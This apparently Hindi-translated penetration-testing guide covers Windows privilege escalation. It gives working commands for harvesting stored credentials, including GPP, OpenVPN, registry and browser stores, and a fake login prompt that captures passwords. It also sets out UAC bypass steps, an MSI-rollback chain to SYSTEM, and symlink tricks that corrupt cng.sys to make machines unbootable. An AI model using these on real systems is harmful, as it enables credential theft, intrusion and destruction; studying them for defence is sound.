- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword को डिक्रिप्ट करने के लिए:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec का उपयोग करके passwords प्राप्त करना:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
credentials के साथ web.config का उदाहरण:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN क्रेडेंशियल्स
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### लॉग्स
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### credentials के लिए पूछें

आप हमेशा **उपयोगकर्ता से उसके credentials दर्ज करने के लिए कह सकते हैं या यहां तक कि किसी अन्य उपयोगकर्ता के credentials** अगर आपको लगता है कि वह उन्हें जान सकता है (ध्यान दें कि **पूछना** client से सीधे **credentials** वास्तव में **खतरनाक** है):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **संभावित फ़ाइल नाम जिनमें credentials हो सकते हैं**

कुछ समय पहले ज्ञात फ़ाइलें जिनमें **passwords** **clear-text** या **Base64** में शामिल थीं
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
प्रस्तावित सभी फ़ाइलों की खोज करें:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credentials RecycleBin में

आपको Bin भी जांचना चाहिए ताकि उसके अंदर credentials की तलाश की जा सके

कई प्रोग्रामों द्वारा सेव किए गए **पासवर्ड पुनर्प्राप्त** करने के लिए आप उपयोग कर सकते हैं: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### registry के अंदर

**अन्य संभावित registry keys जिनमें credentials हो सकते हैं**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ब्राउज़र इतिहास

आपको उन dbs की जाँच करनी चाहिए जहाँ **Chrome या Firefox** के passwords संग्रहीत होते हैं.\
साथ ही ब्राउज़रों के इतिहास, बुकमार्क और पसंदीदा की जाँच करें — क्योंकि हो सकता है कुछ **passwords** वहाँ संग्रहीत हों।

ब्राउज़र से passwords निकालने के लिए टूल्स:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** Windows operating system के भीतर निर्मित एक तकनीक है जो विभिन्न भाषाओं के software components के बीच आपसी संचार (intercommunication) की अनुमति देती है। प्रत्येक COM component को **class ID (CLSID)** के माध्यम से पहचाना जाता है और प्रत्येक component एक या अधिक interfaces के जरिए कार्यक्षमता expose करता है, जिन्हें interface IDs (IIDs) द्वारा पहचाना जाता है।

COM classes और interfaces रजिस्ट्री में **HKEY\CLASSES\ROOT\CLSID** और **HKEY\CLASSES\ROOT\Interface** के अंतर्गत परिभाषित होते हैं। यह रजिस्ट्री **HKEY\LOCAL\MACHINE\Software\Classes** और **HKEY\CURRENT\USER\Software\Classes** को मर्ज करके बनती है = **HKEY\CLASSES\ROOT.**

इस रजिस्ट्री के CLSIDs के भीतर आप child रजिस्ट्री **InProcServer32** पा सकते हैं जिसमें एक **default value** होती है जो किसी **DLL** की ओर संकेत करती है और एक value होती है जिसका नाम **ThreadingModel** है जो **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) या **Neutral** (Thread Neutral) हो सकती है।

![](<../../images/image (729).png>)

बुनियादी तौर पर, अगर आप execute होने वाले किसी भी DLL को **overwrite any of the DLLs** कर सकें, तो आप **escalate privileges** कर सकते हैं अगर वह DLL किसी अन्य user द्वारा execute किया जाएगा।

यह जानने के लिए कि हमलावर COM Hijacking को persistence mechanism के रूप में कैसे उपयोग करते हैं, देखें:


{{#ref}}
com-hijacking.md
{{#endref}}

### **फ़ाइलों और रजिस्ट्री में सामान्य Password खोज**

**फ़ाइल की सामग्री खोजें**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**किसी विशेष फ़ाइलनाम वाली फ़ाइल खोजें**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**रजिस्ट्री में कुंजी नाम और पासवर्ड खोजें**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### पासवर्ड खोजने वाले टूल

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** प्लगइन है। यह प्लगइन शिकार के अंदर **automatically execute every metasploit POST module that searches for credentials** करने के लिए बनाया गया है।\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) इस पेज में बताई गई उन सभी फाइलों को स्वचालित रूप से खोजता है जिनमें पासवर्ड होते हैं।\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) सिस्टम से पासवर्ड निकालने का एक और बेहतरीन टूल है।

यह टूल [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) कई टूल्स के **sessions**, **usernames** और **passwords** खोजता है जो यह डेटा clear text में सेव करते हैं (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

मान लीजिए कि **SYSTEM के रूप में चल रहा एक process `OpenProcess()` के जरिए `full access` के साथ एक नया process खोलता है**। वही process **`CreateProcess()` के जरिए एक नया process बनाता है** जिसमें `low privileges` होते हैं पर वह main process के सभी `open handles` को inherit करता है।\
यदि आपके पास उस low privileged process पर **`full access`** है, तो आप `OpenProcess()` से बनाए गए privileged process के लिए मौजूद `open handle` पकड़कर उसमें एक `shellcode` inject कर सकते हैं।\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Shared memory segments, जिन्हें **pipes** कहा जाता है, process communication और data transfer की सुविधा देते हैं।

Windows Named Pipes नामक एक feature देता है, जो unrelated processes को data share करने की अनुमति देता है, यहाँ तक कि अलग-अलग networks पर भी। यह client/server architecture जैसा दिखता है, जिसमें रोल्स को **named pipe server** और **named pipe client** के रूप में परिभाषित किया गया है।

जब कोई **client** pipe के माध्यम से data भेजता है, तो उस pipe को सेट करने वाला **server** client की identity अपनाने में सक्षम होता है, अगर उसके पास आवश्यक `SeImpersonate` rights हों। किसी ऐसे **privileged process** की पहचान करना जो उस pipe के जरिए communicate करता है और जिसकी आप नकल कर सकते हैं, आपको उस process की identity अपना कर उच्च privileges हासिल करने का मौका देता है जब वह आपके बनाए pipe से interact करे। ऐसे हमले को करने के निर्देशों के लिए मददगार गाइड्स [**here**](named-pipe-client-impersonation.md) और [**here**](#from-high-integrity-to-system) पर मिलते हैं।

इसके अलावा निम्न tool से आप burp जैसे tool के साथ named pipe communication intercept कर सकते हैं: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) और यह tool सभी pipes को list और दर्शाकर privescs ढूँढने की सुविधा देता है: [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

The Telephony service (TapiSrv) server mode में `\\pipe\\tapsrv` (MS-TRP) expose करता है। एक remote authenticated client mailslot-based async event path को abuse कर सकता है ताकि `ClientAttach` को किसी भी existing path पर arbitrary 4-byte write में बदला जा सके जो `NETWORK SERVICE` द्वारा writable हो, फिर Telephony admin rights हासिल करके arbitrary DLL को service के रूप में load किया जा सके। पूरा flow:

- `ClientAttach` में `pszDomainUser` को किसी writable existing path पर सेट करना → service उसे `CreateFileW(..., OPEN_EXISTING)` के द्वारा खोलती है और async event writes के लिए उपयोग करती है।
- हर event attacker-controlled `InitContext` (from `Initialize`) को उस handle पर लिखता है। एक line app को `LRegisterRequestRecipient` (`Req_Func 61`) के साथ register करें, `TRequestMakeCall` (`Req_Func 121`) trigger करें, `GetAsyncEvents` (`Req_Func 0`) से fetch करें, फिर unregister/shutdown करके deterministic writes को repeat करें।
- खुद को `C:\Windows\TAPI\tsec.ini` में `[TapiAdministrators]` में जोड़ें, reconnect करें, फिर arbitrary DLL path के साथ `GetUIDllName` को कॉल करके `TSPI_providerUIIdentify` को `NETWORK SERVICE` के रूप में execute कराएँ।

More details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

Check out the page **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Clickable Markdown links जो `ShellExecuteExW` को फॉरवर्ड होते हैं वे खतरनाक URI handlers (`file:`, `ms-appinstaller:` या कोई भी registered scheme) trigger कर सकते हैं और attacker-controlled files को current user के रूप में execute कर सकते हैं। देखें:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

जब user के रूप में shell मिल जाए, तो संभव है कि scheduled tasks या अन्य processes चल रहे हों जो credentials को command line पर पास करते हों। नीचे दिया गया script हर दो सेकंड पर process command lines को capture करता है और वर्तमान स्थिति की पिछली स्थिति से तुलना करके किसी भी अंतर को output करता है।
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Stealing passwords from processes

## From Low Priv User to NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

यदि आपके पास ग्राफ़िकल इंटरफ़ेस (console या RDP के माध्यम से) तक पहुँच है और UAC सक्षम है, तो कुछ Microsoft Windows संस्करणों में एक unprivileged user से "NT\AUTHORITY SYSTEM" जैसे terminal या किसी अन्य process को चलाना संभव है।

यह एक ही vulnerability के जरिए एक ही समय में privileges escalate करना और UAC bypass करना संभव बनाता है। इसके अलावा, कुछ भी install करने की जरूरत नहीं होती और प्रक्रिया में उपयोग किया गया binary Microsoft द्वारा signed और issued होता है।

प्रभावित प्रणालियों में निम्नलिखित शामिल हैं:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
इस vulnerability को exploit करने के लिए, निम्नलिखित कदम उठाना आवश्यक है:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## From Administrator Medium to High Integrity Level / UAC Bypass

Read this to **learn about Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Then **read this to learn about UAC and UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

The technique described [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) with a exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

हमलावर बुनियादी तौर पर Windows Installer के rollback फीचर का दुरुपयोग करते हुए अनइंस्टॉलेशन प्रक्रिया के दौरान वैध फ़ाइलों को दुर्भावनापूर्ण फ़ाइलों से बदल देता है। इसके लिए आक्रमणकारी को एक **malicious MSI installer** बनाना होगा जो `C:\Config.Msi` फ़ोल्डर को hijack करने के लिए उपयोग होगा, जिसे बाद में Windows Installer अन्य MSI पैकेजों की अनइंस्टॉलेशन के दौरान rollback फ़ाइलें स्टोर करने के लिए उपयोग करेगा — जहाँ rollback फ़ाइलों को दुर्भावनापूर्ण payload समाहित करने के लिए मॉडिफाई किया जाएगा।

सारांश तकनीक निम्नलिखित है:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI  
  - एक `.msi` बनाएं जो एक harmless फ़ाइल (उदा., `dummy.txt`) को एक writable फ़ोल्डर (`TARGETDIR`) में इंस्टॉल करे।  
  - इंस्टॉलर को **"UAC Compliant"** के रूप में मार्क करें, ताकि एक **non-admin user** इसे चला सके।  
  - इंस्टॉल के बाद फ़ाइल पर एक **handle** खुला रखें।

- Step 2: Begin Uninstall  
  - उसी `.msi` को अनइंस्टॉल करें।  
  - अनइंस्टॉल प्रक्रिया फ़ाइलों को `C:\Config.Msi` में मूव करना शुरू कर देती है और उन्हें `.rbf` फ़ाइलों के रूप में rename कर देती है (rollback backups)।  
  - `.rbf` बनने पर पता लगाने के लिए `GetFinalPathNameByHandle` का उपयोग करके खुले फ़ाइल हैंडल को **poll** करें जब फ़ाइल `C:\Config.Msi\<random>.rbf` बन जाती है।

- Step 3: Custom Syncing  
  - `.msi` में एक **custom uninstall action (`SyncOnRbfWritten`)** शामिल है जो:  
    - संकेत देता है जब `.rbf` लिखा जा चुका होता है।  
    - फिर अनइंस्टॉल जारी रखने से पहले किसी और event पर **wait** करता है।

- Step 4: Block Deletion of `.rbf`  
  - संकेत मिलने पर, `.rbf` फ़ाइल को `FILE_SHARE_DELETE` के बिना खोलें — यह इसे **delete किए जाने से रोकता है**।  
  - फिर uninstall के समाप्त होने के लिए **signal back** करें।  
  - Windows Installer `.rbf` को delete करने में असफल रहता है, और क्योंकि यह सभी contents को delete नहीं कर सकता, **`C:\Config.Msi` हटाई नहीं जाती**।

- Step 5: Manually Delete `.rbf`  
  - आप (attacker) `.rbf` फ़ाइल को मैन्युअली delete कर देते हैं।  
  - अब **`C:\Config.Msi` खाली है**, और hijack के लिए तैयार है।

> इस बिंदु पर, `C:\Config.Msi` को delete करने के लिए **SYSTEM-level arbitrary folder delete vulnerability** को trigger करें।

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs  
  - स्वयं `C:\Config.Msi` फ़ोल्डर को फिर से बनाएं।  
  - कमजोर DACLs सेट करें (उदा., Everyone:F), और `WRITE_DAC` के साथ एक handle खुला रखें।

- Step 7: Run Another Install  
  - `.msi` को फिर से इंस्टॉल करें, जिसमें:  
    - `TARGETDIR`: Writable location.  
    - `ERROROUT`: एक variable जोforced failure ट्रिगर करता है।  
  - यह इंस्टॉल फिर से **rollback** को ट्रिगर करने के लिए उपयोग किया जाएगा, जो `.rbs` और `.rbf` पढ़ता है।

- Step 8: Monitor for `.rbs`  
  - `ReadDirectoryChangesW` का उपयोग करके `C:\Config.Msi` की निगरानी करें जब तक कि एक नई `.rbs` न दिखे।  
  - उसका filename कैप्चर करें।

- Step 9: Sync Before Rollback  
  - `.msi` में एक **custom install action (`SyncBeforeRollback`)** शामिल है जो:  
    - `.rbs` बनते ही एक event signal करता है।  
    - फिर जारी रखने से पहले **wait** करता है।

- Step 10: Reapply Weak ACL  
  - `.rbs created` event प्राप्त होने के बाद:  
    - Windows Installer `C:\Config.Msi` पर मजबूत ACLs वापस लागू करता है।  
    - लेकिन क्योंकि आपके पास अभी भी `WRITE_DAC` के साथ एक handle है, आप फिर से कमजोर ACLs **reapply** कर सकते हैं।

> ACLs केवल handle open पर लागू होते हैं, इसलिए आप अभी भी फोल्डर में लिख सकते हैं।

- Step 11: Drop Fake `.rbs` and `.rbf`  
  - `.rbs` फ़ाइल को ओवरराइट करके एक **fake rollback script** डालें जो Windows को बताती है कि:  
    - आपकी `.rbf` फ़ाइल (malicious DLL) को एक **privileged location** में restore किया जाए (उदा., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`)।  
    - आपकी fake `.rbf` ड्रॉप करें जिसमें एक **malicious SYSTEM-level payload DLL** हो।

- Step 12: Trigger the Rollback  
  - sync event को signal करें ताकि installer आगे बढ़े।  
  - एक **type 19 custom action (`ErrorOut`)** कॉन्फ़िगर किया गया है ताकि इंस्टॉल जानबूझकर किसी ज्ञात पॉइंट पर fail हो जाए।  
  - इससे **rollback शुरू** हो जाता है।

- Step 13: SYSTEM Installs Your DLL  
  - Windows Installer:  
    - आपकी malicious `.rbs` पढ़ता है।  
    - आपकी `.rbf` DLL को target location में कॉपी कर देता है।  
  - अब आपकी **malicious DLL एक SYSTEM-loaded path में** मौजूद है।

- Final Step: Execute SYSTEM Code  
  - एक trusted **auto-elevated binary** (उदा., `osk.exe`) चलाएँ जो उस DLL को load करता है जिसे आपने hijack किया।  
  - **Boom**: आपका कोड **SYSTEM** के रूप में execute हो जाता है।

### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

मुख्य MSI rollback तकनीक (पिछली वाली) यह मानती है कि आप किसी **पूरे फ़ोल्डर** (उदा., `C:\Config.Msi`) को delete कर सकते हैं। लेकिन अगर आपकी vulnerability केवल **arbitrary file deletion** की अनुमति देती है तो क्या होगा?

आप NTFS internals का दुरुपयोग कर सकते हैं: प्रत्येक फ़ोल्डर में एक छिपा हुआ alternate data stream होता है जिसे कहा जाता है:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
यह stream फ़ोल्डर का **index metadata** संग्रहीत करता है।

तो, यदि आप किसी फ़ोल्डर का **`::$INDEX_ALLOCATION` stream हटाते हैं**, तो NTFS फ़ाइल सिस्टम से **पूरे फ़ोल्डर को हटा देता है**।

आप यह मानक file deletion APIs का उपयोग करके कर सकते हैं, जैसे:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> भले ही आप *file* delete API को कॉल कर रहे हों, यह **फ़ोल्डर को ही डिलीट कर देता है**।

### फोल्डर की सामग्री हटाने से SYSTEM EoP तक
अगर आपका primitive आपको arbitrary files/folders को डिलीट करने की अनुमति नहीं देता, लेकिन यह **attacker-controlled folder के *contents* को डिलीट करने की अनुमति देता है** तो क्या होगा?

1. कदम 1: एक चारा फ़ोल्डर और फ़ाइल सेटअप करें
- बनाएँ: `C:\temp\folder1`
- इसके अंदर: `C:\temp\folder1\file1.txt`

2. कदम 2: `file1.txt` पर एक **oplock** लगाएँ
- यह oplock **एक्ज़िक्यूशन को रोक देता है** जब कोई विशेषाधिकार प्राप्त प्रक्रिया `file1.txt` को डिलीट करने की कोशिश करती है।
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Step 3: SYSTEM प्रक्रिया को ट्रिगर करें (उदा., `SilentCleanup`)
- यह प्रक्रिया फ़ोल्डरों (उदा., `%TEMP%`) को स्कैन करती है और उनकी सामग्री को हटाने की कोशिश करती है।
- जब यह `file1.txt` पर पहुँचता है, तो **oplock ट्रिगर होता है** और नियंत्रण आपके callback को सौंप देता है।

4. Step 4: oplock callback के अंदर – हटाने को पुनः निर्देशित करें

- विकल्प A: `file1.txt` को कहीं और स्थानांतरित करें
- यह `folder1` को खाली कर देता है बिना oplock को तोड़े।
- सीधे `file1.txt` को डिलीट मत करें — इससे oplock समय से पहले रिलीज़ हो जाएगा।

- विकल्प B: `folder1` को एक **junction** में बदलें:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- विकल्प C: `\RPC Control` में एक **symlink** बनाएँ:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> यह NTFS के आंतरिक stream को लक्षित करता है जो फ़ोल्डर metadata संग्रहीत करता है — इसे हटाने से फ़ोल्डर ही हट जाता है।

5. चरण 5: oplock को रिहा करें
- SYSTEM process जारी रहता है और `file1.txt` को हटाने की कोशिश करता है।
- लेकिन अब, junction + symlink के कारण, यह वास्तव में हटा रहा है:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**परिणाम**: `C:\Config.Msi` SYSTEM द्वारा हटाया जाता है।

### From Arbitrary Folder Create to Permanent DoS

ऐसी primitive का फायदा उठाएँ जो आपको **create an arbitrary folder as SYSTEM/admin** — भले ही **you can’t write files** या **set weak permissions**।

एक **folder** (not a file) बनाएँ जिसका नाम किसी **critical Windows driver** का हो, उदा.:
```
C:\Windows\System32\cng.sys
```
- यह पथ सामान्यतः `cng.sys` kernel-mode driver से संबंधित होता है।
- यदि आप इसे पहले से ही एक फ़ोल्डर के रूप में **pre-create** करते हैं, तो Windows बूट पर वास्तविक driver को लोड करने में विफल रहता है।
- इसके बाद, Windows बूट के दौरान `cng.sys` लोड करने की कोशिश करता है।
- यह फ़ोल्डर देखकर, **वास्तविक driver को resolve करने में विफल रहता है**, और **क्रैश या बूट रोक देता है**।
- कोई **fallback** नहीं होता, और बाहरी हस्तक्षेप के बिना (जैसे boot repair या disk access) **कोई recovery नहीं** होता।

### Privileged log/backup paths + OM symlinks से arbitrary file overwrite / boot DoS तक

जब कोई **privileged service** logs/exports को उस पथ पर लिखता है जो किसी **writable config** से पढ़ा गया हो, तो उस पथ को **Object Manager symlinks + NTFS mount points** से redirect करके privileged write को arbitrary overwrite में बदला जा सकता है (यहाँ तक कि **बिना** SeCreateSymbolicLinkPrivilege के भी)।

**आवश्यकताएँ**
- लक्ष्य पथ संग्रहीत करने वाला config attacker द्वारा writable होना चाहिए (उदा., `%ProgramData%\...\.ini`)।
- `\RPC Control` पर mount point बनाने और OM file symlink बनाने की क्षमता (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools))।
- कोई privileged operation जो उस पथ पर लिखे (log, export, report)।

**उदाहरण श्रृंखला**
1. config पढ़कर विशेषाधिकार प्राप्त लॉग गंतव्य प्राप्त करें, जैसे `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` जो `C:\ProgramData\ICONICS\IcoSetup64.ini` में है।
2. बिना admin के पथ को redirect करें:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Privileged component के लॉग लिखने का इंतजार करें (उदा., admin "send test SMS" trigger करता है)। अब लिखावट `C:\Windows\System32\cng.sys` में जाती है।
4. ओवरराइट हुए लक्ष्य (hex/PE parser) का निरीक्षण करके करप्शन की पुष्टि करें; reboot करने पर Windows टेम्पर्ड driver path को लोड करने के लिए मजबूर होता है → **boot loop DoS**। यह किसी भी protected file पर भी सामान्यीकृत होता है जिसे एक privileged service write के लिए खोलेगा।

> `cng.sys` सामान्यतः `C:\Windows\System32\drivers\cng.sys` से लोड होता है, लेकिन अगर एक copy `C:\Windows\System32\cng.sys` में मौजूद है तो पहले उसे प्रयत्न किया जा सकता है, जिससे यह corrupt data के लिए एक reliable DoS sink बन जाता है।



## **High Integrity से System तक**

### **नया service**

यदि आप पहले से ही एक High Integrity process पर चल रहे हैं, तो **path to SYSTEM** बस **नया service बनाकर और execute करके** आसान हो सकता है:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> service binary बनाते समय सुनिश्चित करें कि यह एक valid service हो या binary आवश्यक क्रियाएँ इतनी तेज़ी से करे क्योंकि अगर यह valid service नहीं है तो इसे 20s में बंद कर दिया जाएगा।

### AlwaysInstallElevated

High Integrity process से आप कोशिश कर सकते हैं कि **AlwaysInstallElevated registry entries को enable** करें और एक reverse shell को _**.msi**_ wrapper का उपयोग करके **install** करें.\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**आप** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

यदि आपके पास वे token privileges हैं (शायद आपको यह पहले से ही किसी High Integrity process में मिलेगा), तो आप SeDebug privilege के साथ लगभग किसी भी process (protected processes को छोड़कर) को **open** कर पाएँगे, process का **token copy** कर पाएँगे, और उस token के साथ एक **arbitrary process create** कर पाएँगे.\
